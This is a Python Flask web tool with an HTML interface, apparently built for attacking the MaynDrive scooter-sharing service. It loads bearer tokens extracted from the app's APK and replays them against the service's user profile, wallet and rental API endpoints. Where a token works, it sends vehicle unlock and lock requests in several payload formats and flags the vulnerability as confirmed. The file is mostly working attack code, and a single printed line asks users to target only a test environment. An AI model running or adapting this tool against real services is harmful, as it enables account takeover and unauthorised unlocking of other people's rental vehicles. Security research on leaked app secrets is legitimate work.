#!/usr/bin/env python3
"""
MaynDrive Token Tester Web Interface
Web-based interface for testing extracted tokens against API endpoints
"""

from flask import Flask, render_template, request, jsonify, send_file
import requests
import json
import threading
from pathlib import Path
from datetime import datetime
import os

app = Flask(__name__)

# Global variables for testing
test_results = []
is_testing = False
testing_progress = {"current": 0, "total": 0, "status": "idle"}

def load_tokens():
    """Load tokens from APK analysis"""
    apk_report_path = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/apk_analysis/apk_analysis_report.json"
    
    if not Path(apk_report_path).exists():
        return []
    
    with open(apk_report_path, 'r') as f:
        data = json.load(f)
    
    tokens = data.get('extracted_secrets', {}).get('bearer_tokens', [])
    
    # Filter for potential JWT tokens and long strings
    potential_tokens = []
    for token in tokens:
        if (token.startswith('eyJ') or  # JWT tokens
            len(token) > 50 or  # Long strings
            token.startswith('MIIC') or  # Certificate-like
            'Bearer' in token or  # Bearer tokens
            (len(token) > 20 and token.replace('-', '').replace('_', '').isalnum())):  # Alphanumeric tokens
            potential_tokens.append(token)
    
    return potential_tokens[:20]  # Return first 20 tokens

def test_endpoint(token, api_url, endpoint, method="GET", payload=None):
    """Test a single endpoint with a token"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
        "Accept": "application/json"
    }
    
    try:
        if method == "GET":
            response = requests.get(f"{api_url}{endpoint}", 
                                 headers=headers, timeout=15)
        elif method == "POST":
            response = requests.post(f"{api_url}{endpoint}", 
                                  json=payload, headers=headers, timeout=15)
        else:
            return {"error": f"Unsupported method: {method}"}
        
        return {
            "status_code": response.status_code,
            "success": response.status_code in [200, 201],
            "response_body": response.text[:200] if response.text else "",
            "error": None
        }
        
    except requests.exceptions.Timeout:
        return {"error": "Request timeout", "success": False}
    except requests.exceptions.ConnectionError:
        return {"error": "Connection error", "success": False}
    except Exception as e:
        return {"error": str(e), "success": False}

def run_testing(api_url, scooter_serial, latitude, longitude):
    """Run the testing process"""
    global test_results, is_testing, testing_progress
    
    is_testing = True
    test_results = []
    testing_progress = {"current": 0, "total": 0, "status": "running"}
    
    try:
        tokens = load_tokens()
        if not tokens:
            testing_progress["status"] = "error"
            testing_progress["message"] = "No tokens found"
            return
        
        testing_progress["total"] = len(tokens)
        
        for i, token in enumerate(tokens, 1):
            if not is_testing:
                break
            
            testing_progress["current"] = i
            
            # Test authentication endpoints
            auth_endpoints = [
                {"endpoint": "/api/application/users", "method": "GET", "name": "User Profile"},
                {"endpoint": "/api/application/users/wallet", "method": "GET", "name": "User Wallet"},
                {"endpoint": "/api/application/users/rents", "method": "GET", "name": "User Rentals"},
            ]
            
            results = {
                "token": token[:50] + "..." if len(token) > 50 else token,
                "endpoints": {}
            }
            
            for ep in auth_endpoints:
                result = test_endpoint(token, api_url, ep["endpoint"], ep["method"])
                results["endpoints"][ep["endpoint"]] = {
                    "name": ep["name"],
                    "result": result
                }
            
            # Test vehicle operations if any auth endpoint succeeded
            auth_success = any(ep["result"].get("success") for ep in results["endpoints"].values())
            
            if auth_success:
                # Test different unlock payloads (exactly like TUF script)
                vehicle_payloads = [
                    {
                        "serial_number": scooter_serial,
                        "lat": float(latitude),
                        "lng": float(longitude)
                    },
                    {
                        "serial": scooter_serial,
                        "latitude": float(latitude),
                        "longitude": float(longitude)
                    },
                    {
                        "vehicle_id": scooter_serial,
                        "lat": float(latitude),
                        "lng": float(longitude)
                    }
                ]
                
                # Test unlock with different payload formats
                for i, payload in enumerate(vehicle_payloads, 1):
                    result = test_endpoint(token, api_url, "/api/application/vehicles/unlock", "POST", payload)
                    results["endpoints"][f"/api/application/vehicles/unlock_format_{i}"] = {
                        "name": f"Vehicle Unlock (Format {i})",
                        "result": result
                    }
                
                # Test lock operation
                lock_payload = {
                    "serial_number": scooter_serial,
                    "lat": float(latitude),
                    "lng": float(longitude)
                }
                
                result = test_endpoint(token, api_url, "/api/application/vehicles/freefloat/lock", "POST", lock_payload)
                results["endpoints"]["/api/application/vehicles/freefloat/lock"] = {
                    "name": "Vehicle Lock",
                    "result": result
                }
            
            test_results.append(results)
        
        testing_progress["status"] = "completed"
        
    except Exception as e:
        testing_progress["status"] = "error"
        testing_progress["message"] = str(e)
    finally:
        is_testing = False

@app.route('/')
def index():
    """Main page"""
    return render_template('token_tester.html')

@app.route('/api/start_test', methods=['POST'])
def start_test():
    """Start token testing"""
    global is_testing
    
    if is_testing:
        return jsonify({"error": "Testing already in progress"}), 400
    
    data = request.json
    api_url = data.get('api_url', '').strip()
    scooter_serial = data.get('scooter_serial', 'TEST123')
    latitude = data.get('latitude', '40.7128')
    longitude = data.get('longitude', '-74.0060')
    
    if not api_url:
        return jsonify({"error": "API URL is required"}), 400
    
    try:
        float(latitude)
        float(longitude)
    except ValueError:
        return jsonify({"error": "Invalid latitude or longitude"}), 400
    
    # Start testing in a separate thread
    thread = threading.Thread(target=run_testing, args=(api_url, scooter_serial, latitude, longitude))
    thread.daemon = True
    thread.start()
    
    return jsonify({"message": "Testing started"})

@app.route('/api/stop_test', methods=['POST'])
def stop_test():
    """Stop token testing"""
    global is_testing
    is_testing = False
    return jsonify({"message": "Testing stopped"})

@app.route('/api/progress')
def get_progress():
    """Get testing progress"""
    return jsonify(testing_progress)

@app.route('/api/results')
def get_results():
    """Get test results"""
    return jsonify(test_results)

@app.route('/api/tokens')
def get_tokens():
    """Get available tokens"""
    tokens = load_tokens()
    return jsonify({"tokens": tokens, "count": len(tokens)})

@app.route('/api/save_results')
def save_results():
    """Save results to file"""
    if not test_results:
        return jsonify({"error": "No results to save"}), 400
    
    results_data = {
        "test_configuration": {
            "api_base_url": request.args.get('api_url', ''),
            "test_scooter_serial": request.args.get('scooter_serial', ''),
            "test_location": {
                "lat": request.args.get('latitude', ''),
                "lng": request.args.get('longitude', '')
            }
        },
        "summary": {
            "total_tokens_tested": len(test_results),
            "valid_tokens_found": len([r for r in test_results if any(ep["result"].get("success") for ep in r["endpoints"].values())]),
            "vulnerability_confirmed": len([r for r in test_results if any(ep["result"].get("success") for ep in r["endpoints"].values())]) > 0
        },
        "detailed_results": test_results
    }
    
    filename = f"token_test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    filepath = f"/tmp/{filename}"
    
    with open(filepath, 'w') as f:
        json.dump(results_data, f, indent=2)
    
    return send_file(filepath, as_attachment=True, download_name=filename)

if __name__ == '__main__':
    # Create templates directory if it doesn't exist
    templates_dir = Path(__file__).parent / 'templates'
    templates_dir.mkdir(exist_ok=True)
    
    # Create the HTML template
    html_template = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MaynDrive Token Tester</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        .form-row {
            display: flex;
            gap: 20px;
        }
        .form-row .form-group {
            flex: 1;
        }
        .button-group {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        button {
            padding: 12px 24px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
        }
        .btn-primary {
            background-color: #007bff;
            color: white;
        }
        .btn-danger {
            background-color: #dc3545;
            color: white;
        }
        .btn-success {
            background-color: #28a745;
            color: white;
        }
        .btn-secondary {
            background-color: #6c757d;
            color: white;
        }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .progress-container {
            margin: 20px 0;
        }
        .progress-bar {
            width: 100%;
            height: 20px;
            background-color: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background-color: #007bff;
            transition: width 0.3s ease;
            width: 0%;
        }
        .status {
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-weight: bold;
        }
        .status.info {
            background-color: #d1ecf1;
            color: #0c5460;
        }
        .status.success {
            background-color: #d4edda;
            color: #155724;
        }
        .status.danger {
            background-color: #f8d7da;
            color: #721c24;
        }
        .results {
            margin-top: 30px;
        }
        .result-item {
            border: 1px solid #ddd;
            border-radius: 5px;
            margin: 10px 0;
            padding: 15px;
            background-color: #f9f9f9;
        }
        .result-item.success {
            border-color: #28a745;
            background-color: #d4edda;
        }
        .result-item.danger {
            border-color: #dc3545;
            background-color: #f8d7da;
        }
        .token {
            font-family: monospace;
            background-color: #e9ecef;
            padding: 5px;
            border-radius: 3px;
            word-break: break-all;
        }
        .endpoint-result {
            margin: 5px 0;
            padding: 5px;
            border-radius: 3px;
        }
        .endpoint-result.success {
            background-color: #d4edda;
            color: #155724;
        }
        .endpoint-result.danger {
            background-color: #f8d7da;
            color: #721c24;
        }
        .summary {
            display: flex;
            gap: 20px;
            margin: 20px 0;
            padding: 20px;
            background-color: #f8f9fa;
            border-radius: 5px;
        }
        .summary-item {
            text-align: center;
        }
        .summary-item h3 {
            margin: 0;
            color: #333;
        }
        .summary-item p {
            margin: 5px 0 0 0;
            font-size: 24px;
            font-weight: bold;
        }
        .summary-item.success p {
            color: #28a745;
        }
        .summary-item.danger p {
            color: #dc3545;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 MaynDrive Token Tester</h1>
        
        <form id="testForm">
            <div class="form-group">
                <label for="apiUrl">API Base URL:</label>
                <input type="text" id="apiUrl" name="apiUrl" placeholder="https://api-test.knotcity.io" required>
            </div>
            
            <div class="form-group">
                <label for="scooterSerial">Test Scooter Serial:</label>
                <input type="text" id="scooterSerial" name="scooterSerial" value="TEST123">
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="latitude">Latitude:</label>
                    <input type="number" id="latitude" name="latitude" value="40.7128" step="any">
                </div>
                <div class="form-group">
                    <label for="longitude">Longitude:</label>
                    <input type="number" id="longitude" name="longitude" value="-74.0060" step="any">
                </div>
            </div>
            
            <div class="button-group">
                <button type="button" id="startBtn" class="btn-primary">Start Testing</button>
                <button type="button" id="stopBtn" class="btn-danger" disabled>Stop Testing</button>
                <button type="button" id="saveBtn" class="btn-success" disabled>Save Results</button>
                <button type="button" id="loadBtn" class="btn-secondary">Load Tokens</button>
            </div>
        </form>
        
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div id="progressText">Ready to test</div>
        </div>
        
        <div id="status" class="status info" style="display: none;"></div>
        
        <div class="summary" id="summary" style="display: none;">
            <div class="summary-item">
                <h3>Tokens Tested</h3>
                <p id="tokensTested">0</p>
            </div>
            <div class="summary-item">
                <h3>Valid Tokens</h3>
                <p id="validTokens">0</p>
            </div>
            <div class="summary-item">
                <h3>Vulnerability</h3>
                <p id="vulnerability">Not Tested</p>
            </div>
        </div>
        
        <div class="results" id="results"></div>
    </div>

    <script>
        let isTesting = false;
        let progressInterval;

        document.getElementById('startBtn').addEventListener('click', startTesting);
        document.getElementById('stopBtn').addEventListener('click', stopTesting);
        document.getElementById('saveBtn').addEventListener('click', saveResults);
        document.getElementById('loadBtn').addEventListener('click', loadTokens);

        async function startTesting() {
            const formData = {
                api_url: document.getElementById('apiUrl').value,
                scooter_serial: document.getElementById('scooterSerial').value,
                latitude: document.getElementById('latitude').value,
                longitude: document.getElementById('longitude').value
            };

            try {
                const response = await fetch('/api/start_test', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(formData)
                });

                if (response.ok) {
                    isTesting = true;
                    document.getElementById('startBtn').disabled = true;
                    document.getElementById('stopBtn').disabled = false;
                    document.getElementById('saveBtn').disabled = true;
                    
                    showStatus('Testing started...', 'info');
                    startProgressMonitoring();
                } else {
                    const error = await response.json();
                    showStatus('Error: ' + error.error, 'danger');
                }
            } catch (error) {
                showStatus('Error: ' + error.message, 'danger');
            }
        }

        async function stopTesting() {
            try {
                await fetch('/api/stop_test', { method: 'POST' });
                isTesting = false;
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                showStatus('Testing stopped', 'info');
            } catch (error) {
                showStatus('Error stopping test: ' + error.message, 'danger');
            }
        }

        async function loadTokens() {
            try {
                const response = await fetch('/api/tokens');
                const data = await response.json();
                showStatus(`Loaded ${data.count} tokens from APK analysis`, 'success');
            } catch (error) {
                showStatus('Error loading tokens: ' + error.message, 'danger');
            }
        }

        async function saveResults() {
            const params = new URLSearchParams({
                api_url: document.getElementById('apiUrl').value,
                scooter_serial: document.getElementById('scooterSerial').value,
                latitude: document.getElementById('latitude').value,
                longitude: document.getElementById('longitude').value
            });

            try {
                const response = await fetch('/api/save_results?' + params);
                if (response.ok) {
                    const blob = await response.blob();
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'token_test_results.json';
                    document.body.appendChild(a);
                    a.click();
                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(a);
                    showStatus('Results saved successfully', 'success');
                } else {
                    showStatus('Error saving results', 'danger');
                }
            } catch (error) {
                showStatus('Error saving results: ' + error.message, 'danger');
            }
        }

        function startProgressMonitoring() {
            progressInterval = setInterval(async () => {
                try {
                    const response = await fetch('/api/progress');
                    const progress = await response.json();
                    
                    if (progress.status === 'completed') {
                        clearInterval(progressInterval);
                        isTesting = false;
                        document.getElementById('startBtn').disabled = false;
                        document.getElementById('stopBtn').disabled = true;
                        document.getElementById('saveBtn').disabled = false;
                        
                        showStatus('Testing completed', 'success');
                        loadResults();
                    } else if (progress.status === 'error') {
                        clearInterval(progressInterval);
                        isTesting = false;
                        document.getElementById('startBtn').disabled = false;
                        document.getElementById('stopBtn').disabled = true;
                        showStatus('Error: ' + progress.message, 'danger');
                    } else if (progress.status === 'running') {
                        const percentage = (progress.current / progress.total) * 100;
                        document.getElementById('progressFill').style.width = percentage + '%';
                        document.getElementById('progressText').textContent = 
                            `Testing ${progress.current}/${progress.total} tokens`;
                    }
                } catch (error) {
                    console.error('Error monitoring progress:', error);
                }
            }, 1000);
        }

        async function loadResults() {
            try {
                const response = await fetch('/api/results');
                const results = await response.json();
                
                displayResults(results);
                updateSummary(results);
            } catch (error) {
                showStatus('Error loading results: ' + error.message, 'danger');
            }
        }

        function displayResults(results) {
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = '';

            if (results.length === 0) {
                resultsDiv.innerHTML = '<p>No results to display</p>';
                return;
            }

            results.forEach((result, index) => {
                const hasSuccess = Object.values(result.endpoints).some(ep => ep.result.success);
                const resultDiv = document.createElement('div');
                resultDiv.className = `result-item ${hasSuccess ? 'success' : 'danger'}`;
                
                let html = `<h3>Token ${index + 1}: <span class="token">${result.token}</span></h3>`;
                
                Object.entries(result.endpoints).forEach(([endpoint, data]) => {
                    const success = data.result.success;
                    html += `<div class="endpoint-result ${success ? 'success' : 'danger'}">
                        <strong>${data.name}:</strong> 
                        ${success ? 
                            `✅ SUCCESS (Status: ${data.result.status_code})` : 
                            `❌ FAILED (${data.result.error || data.result.status_code})`
                        }
                    </div>`;
                });
                
                resultDiv.innerHTML = html;
                resultsDiv.appendChild(resultDiv);
            });
        }

        function updateSummary(results) {
            const validTokens = results.filter(r => 
                Object.values(r.endpoints).some(ep => ep.result.success)
            ).length;
            
            document.getElementById('tokensTested').textContent = results.length;
            document.getElementById('validTokens').textContent = validTokens;
            document.getElementById('vulnerability').textContent = 
                validTokens > 0 ? 'CONFIRMED' : 'Not Found';
            document.getElementById('vulnerability').className = 
                validTokens > 0 ? 'danger' : 'success';
            
            document.getElementById('summary').style.display = 'flex';
        }

        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
            statusDiv.style.display = 'block';
            
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 5000);
        }

        // Load tokens on page load
        window.addEventListener('load', loadTokens);
    </script>
</body>
</html>'''
    
    # Write the HTML template
    with open(templates_dir / 'token_tester.html', 'w') as f:
        f.write(html_template)
    
    print("🌐 Starting MaynDrive Token Tester Web Interface")
    print("📱 Open your browser and go to: http://localhost:5000")
    print("⚠️  Make sure to test against your test API environment only")
    
    app.run(host='0.0.0.0', port=5000, debug=True)
